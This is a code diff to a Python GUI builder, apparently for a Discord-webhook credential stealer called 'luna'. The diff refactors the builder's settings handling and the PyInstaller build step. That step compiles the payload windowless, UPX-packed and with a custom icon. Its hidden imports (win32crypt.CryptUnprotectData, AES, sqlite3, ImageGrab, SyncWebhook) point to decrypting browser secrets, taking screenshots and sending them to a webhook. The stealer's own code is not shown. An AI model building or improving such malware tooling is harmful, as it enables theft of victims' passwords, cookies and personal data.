@@ -330,11 +330,9 @@ class App(customtkinter.CTk):
                 self.updated_dictionary[key] = True
             elif checkbox.get() == 0:
                 self.updated_dictionary[key] = False
-            elif self.ping.get() == 1:
-                if self.pingtype.get() == "Here":
-                    self.updated_dictionary["pingtype"] = "Here"
-                elif self.pingtype.get() == "Everyone":
-                    self.updated_dictionary["pingtype"] = "Everyone"
+            ping_message = self.pingtype.get()
+            if ping_message in ["Here", "Everyone"]:
+                self.updated_dictionary["pingtype"] = ping_message
             elif self.ping.get() == 0:
                 self.updated_dictionary["pingtype"] = "None"
 
@@ -344,10 +342,9 @@ class App(customtkinter.CTk):
             self.updated_dictionary["webhook"] = None
 
     def get_filetype(self):
-        if self.fileopts.get() == ".exe":
-            return "exe"
-        elif self.fileopts.get() == ".py":
-            return "py"
+        file_type = self.fileopts.get()
+        if file_type in [".exe", ".py"]:
+            return file_type.replace(".", "")
 
     def reset_check_webhook_button(self):
         self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")
@@ -369,12 +366,11 @@ class App(customtkinter.CTk):
 
     def return_filename(self):
         get_file_name = self.filename.get()
-        if get_file_name == "":
+        if not get_file_name:
             random_name = ''.join(random.choices(string.ascii_letters, k=5))
-            filename = f"test-{random_name}"
+            return f"test-{random_name}"
         else:
-            filename = get_file_name
-        return filename
+            return get_file_name
 
     def get_config(self):
         with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
@@ -398,42 +394,45 @@ class App(customtkinter.CTk):
             exeicon = "NONE"
         else:
             exeicon = self.iconpath
+
         try:
-            subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--clean', '--noconsole', '--upx-dir=./tools', '--distpath', './',
-                            '--hidden-import', 'base64',
-                            '--hidden-import', 'ctypes',
-                            '--hidden-import', 'json',
-                            '--hidden-import', 'os',
-                            '--hidden-import', 'platform',
-                            '--hidden-import', 'random',
-                            '--hidden-import', 're',
-                            '--hidden-import', 'sqlite3',
-                            '--hidden-import', 'time',
-                            '--hidden-import', 'subprocess',
-                            '--hidden-import', 'sys',
-                            '--hidden-import', 'threading',
-                            '--hidden-import', 'uuid',
-                            '--hidden-import', 'shutil.copy2',
-                            '--hidden-import', 'argv',
-                            '--hidden-import', 'tempfile.gettempdir',
-                            '--hidden-import', 'tempfile.mkdtemp',
-                            '--hidden-import', 'zipfile.ZIP_DEFLATED',
-                            '--hidden-import', 'zipfile.ZipFile',
-                            '--hidden-import', 'psutil',
-                            '--hidden-import', 'requests',
-                            '--hidden-import', 'wmi',
-                            '--hidden-import', 'Crypto',
-                            '--hidden-import', 'Crypto.Cipher.AES',
-                            '--hidden-import', 'discord',
-                            '--hidden-import', 'discord.Embed',
-                            '--hidden-import', 'discord.File',
-                            '--hidden-import', 'discord.SyncWebhook',
-                            '--hidden-import', 'PIL',
-                            '--hidden-import', 'PIL.ImageGrab',
-                            '--hidden-import', 'win32crypt',
-                            '--hidden-import', 'win32crypt.CryptUnprotectData',
-                            '--icon', f'{exeicon}',
-                            f'.\\{filename}.py'], capture_output=True, check=True)
+            result = subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--clean', '--noconsole', '--upx-dir=./tools', '--distpath', './',
+                                     '--hidden-import', 'base64',
+                                     '--hidden-import', 'ctypes',
+                                     '--hidden-import', 'json',
+                                     '--hidden-import', 'os',
+                                     '--hidden-import', 'platform',
+                                     '--hidden-import', 'random',
+                                     '--hidden-import', 're',
+                                     '--hidden-import', 'sqlite3',
+                                     '--hidden-import', 'time',
+                                     '--hidden-import', 'subprocess',
+                                     '--hidden-import', 'sys',
+                                     '--hidden-import', 'threading',
+                                     '--hidden-import', 'uuid',
+                                     '--hidden-import', 'shutil.copy2',
+                                     '--hidden-import', 'argv',
+                                     '--hidden-import', 'tempfile.gettempdir',
+                                     '--hidden-import', 'tempfile.mkdtemp',
+                                     '--hidden-import', 'zipfile.ZIP_DEFLATED',
+                                     '--hidden-import', 'zipfile.ZipFile',
+                                     '--hidden-import', 'psutil',
+                                     '--hidden-import', 'requests',
+                                     '--hidden-import', 'wmi',
+                                     '--hidden-import', 'Crypto',
+                                     '--hidden-import', 'Crypto.Cipher.AES',
+                                     '--hidden-import', 'discord',
+                                     '--hidden-import', 'discord.Embed',
+                                     '--hidden-import', 'discord.File',
+                                     '--hidden-import', 'discord.SyncWebhook',
+                                     '--hidden-import', 'PIL',
+                                     '--hidden-import', 'PIL.ImageGrab',
+                                     '--hidden-import', 'win32crypt',
+                                     '--hidden-import', 'win32crypt.CryptUnprotectData',
+                                     '--icon', f'{exeicon}',
+                                     f'.\\{filename}.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if result.returncode != 0:
+                self.error_log(result.stderr)
         except Exception as e:
             self.error_log(e)
 
